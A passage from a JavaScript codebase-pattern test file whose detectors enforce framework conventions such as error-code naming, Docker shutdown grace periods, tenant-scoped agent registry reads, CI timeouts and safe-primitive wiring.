      if (/^\s*(\/\/|\*|\/\*)/.test(line)) continue;   // skip comment lines
      var m;
      re.lastIndex = 0;
      while ((m = re.exec(line)) !== null) {
        var ctor = m[1];                  // class name for the `new XError(` form
        if (ctor && NATIVE[ctor]) continue;   // native error — first arg is the message
        var code = m[3];
        var slash = code.indexOf("/");
        if (/^[A-Z][A-Z0-9_]*$/.test(code)) {
          bad.push({ file: rel, line: li + 1,
            content: "error code \"" + code + "\" is bare UPPER_SNAKE — use namespace/kebab-case (e.g. \"" +
              rel.replace(/^lib\//, "").replace(/\.js$/, "") + "/" + code.toLowerCase().replace(/_/g, "-") + "\")" });
        } else if (slash > 0 && /[a-z0-9][A-Z]/.test(code.slice(0, slash))) {
          bad.push({ file: rel, line: li + 1,
            content: "error code \"" + code + "\" has a camelCase namespace segment — use a kebab-case namespace" });
        }
      }
    }
  }
  bad = _filterMarkers(bad, "error-code-namespace-kebab");
  _report("error codes are namespace/kebab-case (v1 — no bare UPPER_SNAKE or camelCase-namespace codes via new XError / factory)", bad);
}

// v0.13.34 — the wiki compose stop_grace_period MUST exceed the app
// shutdown orchestrator's total grace budget (graceMs) plus the forced-
// exit watchdog margin. Otherwise `docker stop` / a rolling redeploy
// SIGKILLs the container before the DB re-encrypt phase finishes, losing
// every write since the last periodic flush — the encrypted-DB data-loss
// class. Cross-artifact guard so raising graceMs in lib/app-shutdown.js
// without bumping the compose (or dropping the setting) can't silently
// reopen the hole.
function testWikiStopGraceExceedsShutdownBudget() {
  var bad = [];
  var shutdownSrc;
  try { shutdownSrc = fs.readFileSync("lib/app-shutdown.js", "utf8"); }
  catch (_e) { return; }
  var graceM  = /DEFAULT_GRACE_MS\s*=\s*C\.TIME\.seconds\((\d+)\)/.exec(shutdownSrc);
  if (!graceM) return;
  var marginM = /FORCE_EXIT_MARGIN_MS\s*=\s*C\.TIME\.seconds\((\d+)\)/.exec(shutdownSrc);
  var graceS  = parseInt(graceM[1], 10);
  var marginS = marginM ? parseInt(marginM[1], 10) : 0;
  var minGrace = graceS + marginS;
  var composeFiles = ["examples/wiki/docker-compose.yml", "examples/wiki/docker-compose.prod.yml"];
  for (var i = 0; i < composeFiles.length; i += 1) {
    var cf = composeFiles[i];
    var text;
    try { text = fs.readFileSync(cf, "utf8"); }
    catch (_e) { continue; }
    var m = /stop_grace_period:\s*'?(\d+)\s*s'?/.exec(text);
    if (!m) {
      bad.push({ file: cf, line: 1,
        content: cf + " declares no stop_grace_period — Docker's 10s default SIGKILLs before " +
                 "the " + graceS + "s shutdown budget finishes the DB re-encrypt. Set " +
                 "stop_grace_period to at least " + minGrace + "s." });
      continue;
    }
    var graceSet = parseInt(m[1], 10);
    if (graceSet < minGrace) {
      bad.push({ file: cf, line: 1,
        content: cf + " stop_grace_period is " + graceSet + "s but the shutdown budget (graceMs " +
                 graceS + "s + watchdog margin " + marginS + "s) needs at least " + minGrace +
                 "s, or the DB re-encrypt is SIGKILLed mid-flush." });
    }
  }
  bad = _filterMarkers(bad, "wiki-stop-grace-below-shutdown-budget");
  _report("wiki compose stop_grace_period exceeds the app shutdown grace budget " +
          "(v0.13.34 — no SIGKILL-before-DB-re-encrypt data loss on docker stop / redeploy)",
    bad);
}

// v0.13.41 — the agent-orchestrator registry-read paths (_list / _lookup)
// MUST consult the tenant gate (_tenantAllows) so an actor can't enumerate
// or acquire a handle to another tenant's agent when tenant scoping is on.
// agent-event-bus enforces this on subscribe/delivery; the orchestrator now
// mirrors it. Encoded so a refactor can't silently drop the gate from
// either read path.
function testOrchestratorRegistryReadsTenantScoped() {
  var bad = [];
  var src;
  try { src = fs.readFileSync("lib/agent-orchestrator.js", "utf8"); }
  catch (_e) { return; }
  ["_list", "_lookup"].forEach(function (fn) {
    var start = src.indexOf("function " + fn + "(");
    if (start === -1) {
      bad.push({ file: "lib/agent-orchestrator.js", line: 1,
        content: fn + " not found — tenant-scope detector can't verify it" });
      return;
    }
    // Body = from this function to the next top-level function declaration.
    var rest = src.slice(start + 1);
    var next = rest.search(/\nasync function |\nfunction /);
    var body = next === -1 ? rest : rest.slice(0, next);
    if (body.indexOf("_tenantAllows") === -1) {
      bad.push({ file: "lib/agent-orchestrator.js", line: 1,
        content: fn + " does not consult _tenantAllows — registry reads must be tenant-scoped " +
                 "(cross-tenant enumeration / handle acquisition leak)" });
    }
  });
  bad = _filterMarkers(bad, "orchestrator-registry-tenant-scope");
  _report("agent-orchestrator _list/_lookup consult the tenant gate " +
          "(v0.13.41 — no cross-tenant registry enumeration / handle acquisition)", bad);
}

// v0.13.19 — a CI job that runs the long test suites (smoke / wiki
// e2e) MUST declare `timeout-minutes`. Without it a hung child (a
// leaked timer / socket / fs.watch handle — the macOS smoke-hang
// class) rides GitHub's 6-hour default before the job is reaped. The
// smoke runner's per-file watchdog (test/smoke.js) catches most
// hangs; this job-level backstop catches the rest and a regressed
// watchdog. Encoded so a new test-running workflow job can't ship
// without the backstop.
function testTestJobsDeclareTimeout() {
  var bad = [];
  var files = _workflowFiles();
  for (var fi = 0; fi < files.length; fi += 1) {
    var wf = files[fi];
    var text;
    try { text = fs.readFileSync(wf, "utf8"); }
    catch (_e) { continue; }
    var lines = text.split(/\r?\n/);
    var jobs = [];            // { name, startLine, lines: [] }
    var inJobs = false;
    var cur = null;
    for (var li = 0; li < lines.length; li += 1) {
      var ln = lines[li];
      if (!inJobs) { if (/^jobs:\s*$/.test(ln)) inJobs = true; continue; }
      // A job key sits at exactly 2-space indent under `jobs:`.
      var jm = ln.match(/^ {2}([A-Za-z0-9_-]+):\s*$/);
      if (jm) { cur = { name: jm[1], startLine: li + 1, lines: [] }; jobs.push(cur); continue; }
      if (cur) cur.lines.push(ln);
    }
    for (var ji = 0; ji < jobs.length; ji += 1) {
      var body = jobs[ji].lines.join("\n");
      var runsSuite = /node\s+test\/smoke\.js/.test(body) || /node\s+test\/e2e\.js/.test(body);
      if (runsSuite && !/(^|\n)\s*timeout-minutes\s*:/.test(body)) {
        bad.push({ file: wf, line: jobs[ji].startLine,
          content: "CI job '" + jobs[ji].name + "' runs the test suite but declares no " +
                   "timeout-minutes — a hung job would ride GitHub's 6h default. Add `timeout-minutes: <n>`." });
      }
    }
  }
  bad = _filterMarkers(bad, "ci-test-job-missing-timeout");
  _report("every CI workflow job that runs the test suite declares timeout-minutes " +
          "(v0.13.19 — no test job rides GitHub's 6h default when a child hangs)", bad);
}

// v0.11.43 drift cleanup — every `@nav` value in a lib/*.js @module
// block MUST be one of the canonical category names below. The wiki
// sidebar derives directly from `@nav`, so unreviewed drift surfaces
// as a duplicate / typo'd category visible to operators. Adding a
// new category is a deliberate site-information-architecture edit —
// it lands in this allowlist + the operator-facing site.config pin
// list (FIRST_GROUPS / LAST_GROUPS) at the same time.
function testNavCategoryAllowlist() {
  var NAV_ALLOWLIST = {
    "AI": 1, "Agent": 1, "Async": 1, "Communication": 1, "Compliance": 1,
    "Concepts": 1, "Crypto": 1, "DX": 1, "Data": 1, "Domain": 1,
    "Filesystem": 1, "Guards": 1, "HTTP": 1, "Identity": 1, "MCP": 1,
    "Mail": 1, "Network": 1, "Observability": 1, "Other": 1, "Parsers": 1,
    "Primitives": 1, "Process": 1, "Production": 1, "Reference": 1,
    "Security": 1, "Supply Chain": 1, "Tools": 1, "Validation": 1,
    "Welcome": 1,
  };
  var bad = [];
  var libFiles = fs.readdirSync("lib")
    .filter(function (f) { return /\.js$/.test(f); })
    .map(function (f) { return "lib/" + f; });
  for (var nf = 0; nf < libFiles.length; nf += 1) {
    var navPath = libFiles[nf];
    var navContent;
    try { navContent = fs.readFileSync(navPath, "utf8"); }
    catch (_e) { continue; }
    var navLines = navContent.split(/\r?\n/);
    for (var nli = 0; nli < navLines.length; nli += 1) {
      var nm = /^\s*\*\s*@nav\s+(.+?)\s*$/.exec(navLines[nli]);
      if (!nm) continue;
      var nav = nm[1];
      if (!Object.prototype.hasOwnProperty.call(NAV_ALLOWLIST, nav)) {
        bad.push({ file: navPath, line: nli + 1,
          content: "@nav \"" + nav + "\" is not in the canonical category allowlist — " +
                   "merge into an existing category (preferred) or add to NAV_ALLOWLIST + " +
                   "FIRST_GROUPS / LAST_GROUPS in examples/wiki/site.config.js" });
      }
    }
  }
  bad = _filterMarkers(bad, "nav-category-allowlist-drift");
  _report("lib/*.js @nav categories match the canonical wiki sidebar list " +
          "(v0.11.43 — prevent re-emergence of Networking-vs-Network / Agent-vs-Agent-Protocols dups)",
    bad);
}

// v0.11.42 Codex P1 — `typeof X !== "object"` accepts null (because
// `typeof null === "object"`), so a structured-validation refusal can
// be bypassed by passing null and crashing the next Object.keys / .X
// access with a raw TypeError instead of the structured error
// callers depend on. Detector flags any line in lib/calendar.js
// containing `typeof <ident> !== "object"` paired with
// `!Array.isArray(<ident>)` that does NOT also gate on `=== null`.
function testCalendarTypeofObjectRefusesNull() {
  var bad = [];
  var path = "lib/calendar.js";
  var content;
  try { content = fs.readFileSync(path, "utf8"); }
  catch (_e) { return; }
  var lines = content.split(/\r?\n/);
  for (var i = 0; i < lines.length; i += 1) {
    var line = lines[i];
    var m = /typeof\s+([a-zA-Z_$][\w.$\]["]*)\s*!==?\s*"object"/.exec(line);
    if (!m) continue;
    var ident = m[1];
    // Look ahead 5 lines for a paired Array.isArray check; if absent
    // this isn't a "is this a plain object" guard so skip.
    var hasArrayCheck = false;
    for (var j = 0; j < 5 && i + j < lines.length; j += 1) {
      if (lines[i + j].indexOf("Array.isArray") !== -1) { hasArrayCheck = true; break; }
    }
    if (!hasArrayCheck) continue;
    // Look both backward (this line + 1 prior, for `if (x === null ||`
    // shape) and inside the same line + the next 2 lines for an
    // explicit null refusal of the same identifier. Full regex-meta
    // escape so any character in `ident` is treated literally —
    // CodeQL flags partial escapes (js/incomplete-sanitization) when
    // backslash isn't covered.
    var identEscaped = ident.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
    var nullGuardRe = new RegExp(identEscaped +
      "\\s*===\\s*null|!\\s*" + identEscaped + "\\b");
    var hasNullGuard = nullGuardRe.test(line) ||
      (i > 0 && nullGuardRe.test(lines[i - 1])) ||
      (i + 1 < lines.length && nullGuardRe.test(lines[i + 1]));
    if (!hasNullGuard) {
      bad.push({ file: path, line: i + 1, content: line.trim() });
    }
  }
  bad = _filterMarkers(bad, "calendar-typeof-object-accepts-null");
  _report("b.calendar validator's `typeof X !== \"object\"` checks must explicitly refuse null " +
          "(v0.11.42 Codex P1 — structured-error stability)",
    bad);
}

// v0.11.41 Codex P1 — BYSETPOS path enumerates candidates starting at
// the period boundary (month/year/week start), so without a startMs
// gate it can emit recurrence instances BEFORE the rule's DTSTART —
// violating RFC 5545 §3.8.5.3 semantics + consuming COUNT on
// instances the operator never asked for. Detector forces the
// expand-with-bysetpos emit loop in lib/calendar.js to keep a
// `pickedMs < startMs` (or equivalent) guard.
function testCalendarBysetposStartGate() {
  var bad = [];
  var path = "lib/calendar.js";
  var content;
  try { content = fs.readFileSync(path, "utf8"); }
  catch (_e) { return; }
  if (/_expandWithBysetpos\b/.test(content)) {
    // The function body must contain a pre-DTSTART gate on the
    // picked candidates. Simple file-scope contains-check is enough
    // since `pickedMs` is locally-scoped to the bysetpos expander.
    if (!/pickedMs\s*<\s*startMs|pickedMs\s*<=\s*startMs/.test(content)) {
      bad.push({ file: path, line: 1,
        content: "_expandWithBysetpos emit loop must gate `pickedMs < startMs` (RFC 5545 §3.8.5.3 — no instances before DTSTART)" });
    }
  }
  bad = _filterMarkers(bad, "calendar-bysetpos-start-gate");
  _report("b.calendar BYSETPOS expand path refuses pre-DTSTART instances " +
          "(v0.11.41 Codex P1 — RFC 5545 §3.8.5.3)",
    bad);
}

function testKnownAntipatterns() {
  // class: known-antipattern
  // Fires at n=1 — any file matching a registered antipattern (and not
  // in its allowlist) fails the gate with a pointer to the primitive
  // that should replace it.
  //
  // Per-entry `scanScope` selects the file set:
  //   - "lib"        (default) — every .js under lib/ except lib/vendor/
  //   - "test"       — every .test.js under test/ (and non-_-prefixed
  //                    helpers/). The waitUntil-vs-setTimeout rule
  //                    runs here; lib-side detectors should NOT scan
  //                    tests.
  //   - "workflows"  — every .yml/.yaml under .github/workflows/.
  //                    Detectors that police supply-chain trust-root
  //                    pins (SHA-pinned reusable workflows) run here.
  var libFiles      = _libFiles();
  var testFiles     = null;                                                            // lazy: most detectors are lib-scoped
  var workflowFiles = null;
  var allBad = [];
  for (var ai = 0; ai < KNOWN_ANTIPATTERNS.length; ai++) {
    var ap = KNOWN_ANTIPATTERNS[ai];
    var allowSet = Object.create(null);
    for (var k = 0; k < ap.allowlist.length; k++) allowSet[ap.allowlist[k]] = true;
    var files;
    if (ap.scanScope === "test") {
      if (testFiles === null) testFiles = _testFiles();
      files = testFiles;
    } else if (ap.scanScope === "workflows") {
      if (workflowFiles === null) workflowFiles = _workflowFiles();
      files = workflowFiles;
    } else {
      files = libFiles;
    }
    var bad = [];
    for (var fi = 0; fi < files.length; fi++) {
      var rel = _relPath(files[fi]);
      if (allowSet[rel]) continue;
      var content;
      try { content = fs.readFileSync(files[fi], "utf8"); }
      catch (_e) { continue; }
      // skipCommentLines: blank out lines that look like jsdoc body /
      // single-line `//` comments before regex test. Multi-line
      // antipatterns (regexes that span lines) MUST NOT set this opt
      // — those need raw content. Per-entry opt-in.
      var subject = content;
      if (ap.skipCommentLines === true) {
        subject = content.split(/\r?\n/).map(function (ln) {
          // Keep `*` lines that are clearly NOT jsdoc bodies (e.g.
          // a leading-`*` in a star-pattern wildcard outside a
          // comment block) by only blanking lines where `*` is the
          // first non-whitespace and the trimmed line starts with
          // `*` (i.e. ` * ...` or `/* ...` or `*/`).
          if (/^\s*(\*|\/\/|\/\*)/.test(ln)) return "";
          return ln;
        }).join("\n");
      }
      var m = ap.regex.exec(subject);
      if (!m) continue;
      // Companion `requires` check — if the same file content names
      // the companion shape, the discipline is satisfied even though
      // the antipattern regex matched (e.g. gunzip + maxOutputLength
      // in the same file = bounded decompression). Test against
      // ORIGINAL content (not the comment-stripped subject) so the
      // companion can appear anywhere in the file.
      if (ap.requires && ap.requires.test(content)) continue;
      // Compute line number from match index against subject — but
      // subject preserves newlines so line numbers stay accurate.
      var lineNum = subject.slice(0, m.index).split(/\r?\n/).length;
      bad.push({
        file: rel,
        line: lineNum,
        content: "antipattern '" + ap.id + "' — use " + ap.primitive,
      });
    }
    if (bad.length) {
      allBad = allBad.concat(bad);
      _report("known-antipattern '" + ap.id + "' — use " + ap.primitive, bad);
    }
  }
  if (allBad.length === 0) {
    check("known-antipattern catalog (n=1 gate)", true);
  }
}

// ---- Pattern: every top-level lib/safe-*.js / lib/guard-*.js MUST
//                be wired into the public surface via index.js ----
//
// class: safe-guard-not-wired-in-index
//
// Discipline: when a new `b.safe*` / `b.guard*` primitive lands in
// lib/, the same PR MUST wire it into the public surface so operators
// can actually compose it. Without this check a primitive can be
// added but forgotten in index.js — orphaned, invisible to operator
// code, and silently unused. The codebase-patterns detectors that
// require "must route through b.safeX" are pointless if `b.safeX`
// isn't even reachable.
//
// The detector:
//   - walks lib/safe-*.js + lib/guard-*.js at the TOP LEVEL ONLY
//     (nested helpers like lib/guard-html-wcag-aria.js are
//     composed by their parent guard and not exposed directly).
//   - reads index.js once and asserts each top-level file:
//       (a) is `require()`'d by path, AND
//       (b) the camelCase name (file `safe-decompress.js` →
//           identifier `safeDecompress`) appears in the
//           module.exports object.
//   - allowlists internal-only primitives that legitimately stay
//     unexposed (composed by another primitive). Each entry
//     carries a reason; mirrors the FUZZ_NOT_REQUIRED shape.
function testSafeGuardWiredInIndex() {
  // class: safe-guard-not-wired-in-index
  var INDEX_WIRING_NOT_REQUIRED = {
    // The aggregator over all guards — every member is wired
    // individually; the aggregator itself IS wired via `guardAll`,
    // but this entry covers the file-vs-name shape.
    "lib/guard-all.js":               "aggregator wired via guardAll; per-member wiring is each member's responsibility",
    // The guard-* family's WCAG sub-helpers are consumed only by
    // lib/guard-html.js (the parent). They're not operator-facing
    // primitives in their own right.
    "lib/guard-html-wcag.js":         "internal helper consumed by lib/guard-html.js (WCAG check); not exposed directly",
    "lib/guard-html-wcag-aria.js":    "internal helper consumed by lib/guard-html.js (ARIA pass); not exposed directly",
    "lib/guard-html-wcag-forms.js":   "internal helper consumed by lib/guard-html.js (forms pass); not exposed directly",
    "lib/guard-html-wcag-tables.js":  "internal helper consumed by lib/guard-html.js (tables pass); not exposed directly",
    "lib/guard-html-wcag-tagwalk.js": "internal helper consumed by lib/guard-html.js (DOM walk); not exposed directly",
    // safe-async is wired as `safeAsync` at the framework root and
    // referenced internally; it's exposed via `b.safeAsync`. Verified
    // — keep tracking, no allowlist needed. (No entry here.)
  };

  var libFiles = _libFiles().filter(function (full) {
    var rel = _relPath(full);
    // Top-level lib/ only (no nested subdirs); the safe-*/guard-*
    // primitives are top-level by convention.
    return /^lib\/(safe-|guard-)[^/]+\.js$/.test(rel);
  });

  // Read index.js once. The framework's index.js is the single
  // operator-facing public-surface entry point.
  var indexPath = path.resolve(__dirname, "..", "..", "index.js");
  var indexContent;
  try { indexContent = fs.readFileSync(indexPath, "utf8"); }
  catch (_e) {
    check("safe/guard-wired-in-index — index.js read", false);
    return;
  }

  var unwired = [];
  for (var i = 0; i < libFiles.length; i++) {
    var rel = _relPath(libFiles[i]);
    if (INDEX_WIRING_NOT_REQUIRED[rel]) continue;
    var base = path.basename(rel, ".js");                                              // safe-decompress
    // Naive kebab→camel produces a candidate, but framework
    // conventions don't always follow it (`safe-jsonpath` →
    // `safeJsonPath` not `safeJsonpath`; `guard-managesieve-command`
    // → `guardManageSieveCommand`). Instead of guessing, EXTRACT
    // the actual identifier from the file's require()-line in
    // index.js and check that THAT identifier appears as an
    // export key.
    //
    //   var <id> = require("./lib/<base>");
    //   ... module.exports = { ..., <id>: <id>, ... }
    var escapedBase = base.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
    // Two wiring shapes are accepted:
    //   1. Top-level binding form:
    //        var <id> = require("./lib/<base>");
    //        module.exports = { ..., <id>: <id>, ... }
    //   2. Inline-in-export form:
    //        module.exports = { ..., <id>: require("./lib/<base>"), ... }
    var topLevelRe = new RegExp(
      "var\\s+(\\w+)\\s*=\\s*require\\(\\s*[\"']\\./lib/" + escapedBase +
      "(?:\\.js)?[\"']\\s*\\)(?:\\s*\\.\\s*\\w+)?");
    var inlineRe = new RegExp(
      "(\\w+)\\s*:\\s*require\\(\\s*[\"']\\./lib/" + escapedBase +
      "(?:\\.js)?[\"']\\s*\\)(?:\\s*\\.\\s*\\w+)?");

    var matched   = indexContent.match(topLevelRe);
    var inlineMatched = indexContent.match(inlineRe);
    var requireOk = !!matched || !!inlineMatched;
    var ident     = matched ? matched[1] : (inlineMatched ? inlineMatched[1] : null);
    var exportOk  = false;
    if (inlineMatched) {
      // Inline form means the require IS the export — both legs satisfied.
      exportOk = true;
    } else if (ident) {
      var exportPattern = new RegExp("\\b" + ident + "\\s*:");
      exportOk = exportPattern.test(indexContent);
    }
    if (!requireOk || !exportOk) {
      unwired.push({
        file:    rel,
        line:    1,
        content: "missing index.js wiring — expected `var <id> = require(\"./lib/" + base +
                 "\")` + `<id>:` export, OR inline `<id>: require(\"./lib/" + base +
                 "\")` form (require=" +
                 (requireOk ? "ok (id=" + ident + ")" : "MISSING") + ", export=" +
                 (exportOk ? "ok" : "MISSING") + ")",
      });
    }
  }

  _report("every top-level lib/safe-*.js / lib/guard-*.js is wired into index.js " +
          "(require + export name) — operators can compose every shipped primitive",
    unwired);
}

// ---- Pattern: every "must-compose" safe-*/guard-* primitive has a
//                paired KNOWN_ANTIPATTERN that flags raw uses of the
//                unsafe API to force the discipline ----
//
// class: safe-guard-not-paired-with-must-compose-detector
//
// Some safe-*/guard-* primitives REPLACE an unsafe-by-default API
// (e.g. `b.safeDecompress` replaces `zlib.gunzip*` / `inflate*`;
// `b.safeUrl` replaces `new URL()`; `b.safeJson.parse` replaces
// `JSON.parse`). For those, the framework's discipline is:
//
//   - the primitive exists in lib/
//   - the primitive is wired into index.js (previous test enforces)
//   - a KNOWN_ANTIPATTERN catches new lib/ code that uses the unsafe
//     API directly, with the safe primitive in the `primitive` field
//     as the recommended replacement
//
// Without the third leg, the primitive is reachable but the
// discipline is unenforced — new lib/ code can keep bypassing.
//
// Other safe-*/guard-* primitives are ADDITIVE utilities (no clear
// unsafe-equivalent — `safeSchema`, `safeAsync.sleep`, `guardAll`
// aggregator). Those carry an explicit MUST_COMPOSE_NOT_REQUIRED
// entry with the reason.
function testSafeGuardHasMustComposeDetector() {
  // class: safe-guard-not-paired-with-must-compose-detector
  //
  // INVERTED ALLOWLIST: most safe-*/guard-* primitives are operator-
  // boundary validators (content guards / parsers operators wire at
  // the request boundary). For THOSE, the "must compose in lib/"
  // pattern doesn't apply — operators wire them at the request
  // handler level, not lib/.
  //
  // The check applies ONLY to primitives in MUST_COMPOSE_REQUIRED —
  // primitives that explicitly REPLACE an unsafe-by-default lib/-side
  // API and whose discipline the framework wants to enforce on
  // future lib/ contributions.
  //
  // When adding a NEW must-compose primitive, two-step:
  //   1. Add the primitive to MUST_COMPOSE_REQUIRED here.
  //   2. Add the paired KNOWN_ANTIPATTERN whose `primitive` field
  //      names the new camelCase identifier as the recommended
  //      replacement for the unsafe API it covers.
  // The detector enforces both legs in the same PR — landing the
  // primitive without the detector fails the gate.
  //
  // [[feedback_new_safe_primitive_ships_with_must_compose_detector]]
  var MUST_COMPOSE_REQUIRED = {
    // v0.11.5 — replaces direct `zlib.gunzip*` / `inflate*` /
    // `unzip*` / `brotli*` in lib/ via the
    // `zlib-decompress-not-via-safedecompress` antipattern.
    "lib/safe-decompress.js": "safeDecompress",
    // v0.11.6 — replaces direct `/proc/self/mountinfo` reads in lib/
    // via the `mountinfo-not-via-safemountinfo` antipattern.
    "lib/safe-mount-info.js": "safeMountInfo",
  };

  var antipatternCorpus = KNOWN_ANTIPATTERNS.map(function (ap) {
    return (ap.id || "") + " :: " + (ap.primitive || "");
  }).join("\n");

  var unpaired = [];
  for (var rel in MUST_COMPOSE_REQUIRED) {
    if (!Object.prototype.hasOwnProperty.call(MUST_COMPOSE_REQUIRED, rel)) continue;
    var camel = MUST_COMPOSE_REQUIRED[rel];
    var pattern = new RegExp("\\b" + camel + "\\b");
    if (!pattern.test(antipatternCorpus)) {
      unpaired.push({
        file:    rel,
        line:    1,
        content: "MUST_COMPOSE_REQUIRED registered the primitive `" + camel +
                 "` but no KNOWN_ANTIPATTERN entry names it as the recommended replacement. " +
                 "Add a detector that catches the unsafe API this primitive replaces, with `" +
                 camel + "` in the `primitive` field.",
      });
    }
  }

  _report("every must-compose safe-*/guard-* primitive is paired with a KNOWN_ANTIPATTERN " +
          "that forces lib/ code to use it instead of the raw unsafe API",
    unpaired);
}

// ---- Pattern: every `@primitive b.X.Y` doc block resolves to a real
//               callable on the public surface (advertised-vs-actual
//               reachability). A wiki page that documents an
//               uncallable path is an operator-facing lie: an operator
//               following the docs gets `undefined is not a function`.
//
// Two shapes this catches:
//   - a wiring gap (the primitive's `create` exists but was never
//     wired into index.js, so `b.middleware.requireBoundKey` was
//     undefined);
//   - a doc-path drop (`b.cra.conformityAssessment` where the real
//     path is `b.cra.report.conformityAssessment`).
//
// Factory namespaces (the parent exposes `create`) document instance
// methods on the create()-return value with namespace shorthand
// (`b.auth.oauth.parseCallback` is reached via
// `b.auth.oauth.create(...).parseCallback`). Those are NOT gaps, so a
// parent that exposes `create` is skipped.
function testPrimitiveReachability() {
  // class: primitive-unreachable
  var bSurface;
  try { bSurface = require("../../index.js"); }
  catch (_e) { check("primitive-reachability — index.js require", false); return; }

  function resolve(dotted) {
    var parts = dotted.split(".");
    var cur = bSurface;
    for (var i = 1; i < parts.length; i += 1) {
      if (cur == null) return undefined;
      cur = cur[parts[i]];
    }
    return cur;
  }

  // Walk the dotted prefix (every segment except the leaf) so a break at
  // ANY segment — including a wholesale-wrong namespace whose parent
  // resolves to undefined — is surfaced rather than silently skipped. A
  // function OR a `.create`-bearing object anywhere in the chain is a
  // factory-instance shorthand and stays exempt.
  function walkPrefix(name, surface) {
    var parts = name.split(".");
    var cur = surface;
    for (var i = 1; i < parts.length - 1; i += 1) {
      // A missing prefix segment is a wrong-namespace doc path even when
      // `cur` is itself a factory (has `.create`): a namespace that ALSO
      // has real static children (e.g. b.mail.create + b.mail.bimi /
      // b.mail.rbl) is used statically, so an undefined child is a typo,
      // not a factory-instance method. The factory-shorthand exemption is
      // therefore applied ONLY at the leaf parent (the trailing function
      // check below + the caller's `.create` check) — never at an
      // intermediate segment, which would mask the typo.
      if (cur == null || typeof cur[parts[i]] === "undefined") {
        return { brokenName: parts.slice(0, i + 1).join(".") };
      }
      cur = cur[parts[i]];
    }
    if (typeof cur === "function") return { factory: true };
    return { parent: cur, parentName: parts.slice(0, -1).join(".") };
  }

  // @primitive paths that legitimately don't resolve as a flat member
  // (documented elsewhere / intentional). Keyed by dotted name.
  var REACHABILITY_ALLOWLIST = {
    // (none — every surfaced gap is fixed in-tree)
  };

  // Self-test (locks the fix): a missing intermediate segment under a
  // mixed factory+static namespace must be flagged, never masked by the
  // factory-shorthand exemption.
  var _rMock  = { mail: { create: function () {}, bimi: {} } };
  var _rProbe = walkPrefix("b.mail.bmi.recordShape", _rMock);
  check("primitive-reachability: typo under a mixed factory namespace is flagged",
        _rProbe.brokenName === "b.mail.bmi");

  var libFiles = _libFiles();
  var unreachable = [];
  for (var i = 0; i < libFiles.length; i += 1) {
    var rel = _relPath(libFiles[i]);
    var src = fs.readFileSync(libFiles[i], "utf8");
    var re = /@primitive\s+(b\.[A-Za-z0-9_.]+)/g;
    var m;
    while ((m = re.exec(src)) !== null) {
      var name = m[1];
      if (REACHABILITY_ALLOWLIST[name]) continue;
      if (typeof resolve(name) !== "undefined") continue;
      var w = walkPrefix(name, bSurface);
      // Factory-instance shorthands (b.X.create() → instance method) skip.
      if (w.factory) continue;
      if (w.brokenName) {
        // The whole dotted namespace prefix is unresolvable — the parent
        // resolved to undefined, so the flat-namespace check below never
        // fired and the doc-lie was silently skipped. Flag it.
        unreachable.push({
          file:    rel,
          line:    1,
          content: "@primitive " + name + " documents a b.* path that does not resolve (the namespace `" +
                   w.brokenName + "` is undefined — no prefix segment resolves on the public surface). " +
                   "Correct the @primitive/@signature namespace, or wire the namespace into the surface.",
        });
        continue;
      }
      var parent = w.parent;
      var parentName = w.parentName;
      // Flag only flat namespaces (object parent without a `create`
      // factory). Factory-instance shorthands are skipped.
      if (parent && typeof parent === "object" && typeof parent.create !== "function") {
        unreachable.push({
          file:    rel,
          line:    1,
          content: "@primitive " + name + " documents a b.* path that does not resolve (parent `" +
                   parentName + "` is a flat namespace without this member). Wire it into the " +
                   "namespace, or correct the @primitive/@signature path.",
        });
      }
    }
  }
  _report("every @primitive b.X.Y doc block resolves to a callable on the public surface " +
          "(advertised-vs-actual reachability; factory-instance shorthands excluded)",
    unreachable);
}

// ---- Pattern: every access-refusal middleware routes its deny
//               response through lib/middleware/deny-response.js so a
//               consumer can override the body / Content-Type (emit
//               RFC 9457 application/problem+json) via the uniform
//               onDeny / problemDetails opts. A new deny-path
//               middleware that hardcodes
//               `res.writeHead(<4xx/5xx>, { "Content-Type": ... })`
//               locks consumers out of the response shape — which is
//               what pinned rate-limit's 429 to text/plain before this
//               convention existed. ----
function testDenyPathComposesDenyResponse() {
  // class: deny-path-hardcoded-response
  var MW_ROOT = path.resolve(LIB_ROOT, "middleware");
  // NOT access-refusals: content-servers that 4xx when the
  // .well-known resource isn't configured, and the CSP report-ingest
  // machine endpoint. Their 4xx is not a user-facing access denial.
  var NOT_DENY_PATH = {
    "lib/middleware/assetlinks.js":       ".well-known content-server; 4xx = not-configured, not access-refusal",
    "lib/middleware/security-txt.js":     ".well-known content-server; 4xx = not-configured, not access-refusal",
    "lib/middleware/web-app-manifest.js": "manifest content-server; 4xx = not-configured, not access-refusal",
    "lib/middleware/csp-report.js":       "CSP report-ingest machine endpoint; 4xx = malformed-report rejection on a browser-posting sink",
    "lib/middleware/deny-response.js":    "the shared deny-response helper itself",
  };
  var denyStatusRe = new RegExp("writeHead\\(\\s*(?:4\\d\\d|5\\d\\d|requestHelpers\\.HTTP_STATUS\\." +
    "(?:FORBIDDEN|UNAUTHORIZED|NOT_FOUND|BAD_REQUEST|METHOD_NOT_ALLOWED|UNSUPPORTED_MEDIA_TYPE|" +
    "TOO_MANY_REQUESTS|UNAVAILABLE_FOR_LEGAL_REASONS|MISDIRECTED_REQUEST))");
  var composesRe = /require\(\s*["']\.\/deny-response["']\s*\)/;
  var files = fs.readdirSync(MW_ROOT).filter(function (f) { return f.endsWith(".js"); });
  var violations = [];
  for (var i = 0; i < files.length; i += 1) {
    var rel = "lib/middleware/" + files[i];
    if (NOT_DENY_PATH[rel]) continue;
    var src = fs.readFileSync(path.join(MW_ROOT, files[i]), "utf8");
    if (!denyStatusRe.test(src)) continue;       // doesn't write a deny status
    if (composesRe.test(src)) continue;          // routes through the helper
    var lines = src.split("\n");
    var ln = 1;
    for (var L = 0; L < lines.length; L += 1) {
      if (denyStatusRe.test(lines[L])) { ln = L + 1; break; }
    }
    violations.push({
      file:    rel,
      line:    ln,
      content: "access-refusal middleware writes a deny-status response without composing deny-response.js — " +
               "route it through denyResponse() so consumers get onDeny / problemDetails (RFC 9457). If this " +
               "is NOT an access-refusal (content-server / machine endpoint), add it to NOT_DENY_PATH with a reason.",
    });
  }
  _report("every access-refusal middleware composes deny-response.js (onDeny / problemDetails override path)",
    violations);
}

// ---- Pattern: operator-facing source comments must describe the code,
//               not the internal authoring process. These shapes are
//               internal slice / bug / plan IDs, code-review-process
//               residue (Codex P-levels, PR numbers), and dated
